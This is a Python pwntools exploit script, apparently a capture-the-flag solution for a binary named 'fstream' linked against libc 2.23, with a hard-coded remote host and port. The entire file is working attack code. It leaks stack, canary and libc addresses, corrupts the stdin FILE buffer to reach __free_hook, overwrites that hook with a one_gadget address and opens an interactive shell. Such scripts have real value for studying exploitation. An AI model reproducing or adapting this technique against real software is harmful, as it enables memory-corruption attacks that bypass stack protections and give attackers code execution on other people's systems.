#!/usr/bin/python
from pwn import *
import sys

HOST = "178.62.40.102"
PORT = 6002

def do_leaks():
	log.info("Leak addresses")

	r.recvuntil("> ")

	r.send("A"*0x80)
	r.recv(0x80)
	STACKLEAK = u64(r.recv(6).ljust(8, "\x00"))
	r.recvuntil("> ")

	r.send("A"*0x89)
	r.recv(0x88)
	CANARY = u64(r.recv(6).ljust(8, "\x00"))- 0x41
	r.recvuntil("> ")

	r.send("A"*0x98)
	r.recv(0x98)
	LIBCLEAK = u64(r.recv(6).ljust(8, "\x00"))
	r.recvuntil("> ")

	return STACKLEAK, CANARY, LIBCLEAK

def alloc(size, content):
	r.sendline(str(size))
	r.recvuntil("> ")
	r.send(content)
	r.recvuntil("> ")

def exploit(r):
	r.recvuntil("> ")
	r.sendline("11010110")			# enter leak

	STACKLEAK, CANARY, LIBCLEAK = do_leaks()
	libc.address = LIBCLEAK - libc.symbols["__libc_start_main"] - 0xf0

	log.info("STACK leak       : %s" % hex(STACKLEAK))
	log.info("CANARY           : %s" % hex(CANARY))
	log.info("LIBC leak        : %s" % hex(LIBCLEAK))
	log.info("LIBC             : %s" % hex(libc.address))

	log.info("Enter ccloud")

	r.sendline("11111111")
	r.recvuntil("> ")
	r.sendline("10110101")
	r.recvuntil("> ")

	log.info("Overwrite stdin buf LSB with 0x0")

	r.sendline(str(-(0x10000000000000000- (libc.address + 0x3c4919))))
	
	pause()
	
	log.info("Move stdin buffers near free_hook")

	payload = p64(libc.address + 0x3c67a8) + p64(libc.address + 0x3c67a8)
	payload += p64(libc.address + 0x3c67a8) + p64(libc.address + 0x3c67a8)
	payload += p64(libc.address + 0x3c68d8) + p64(0x0)

	r.sendline(payload)

	pause()

	r.sendline("AAAAAAAAAAAAAAAAAAAAAAA")

	log.info("Overwrite free_hook with one_gadget and trigger shell")
	
	payload = "\x00"*168
	payload += p64(libc.address + 0x4526a)
	r.sendline(payload)

	r.interactive()
	
	return

if __name__ == "__main__":
	libc = ELF("./libc-2.23.so")
	if len(sys.argv) > 1:
		r = remote(HOST, PORT)
		exploit(r)
	else:
		r = process("./fstream", env={"LD_PRELOAD" : "./libc-2.23.so"})
		print util.proc.pidof(r)
		pause()
		exploit(r)
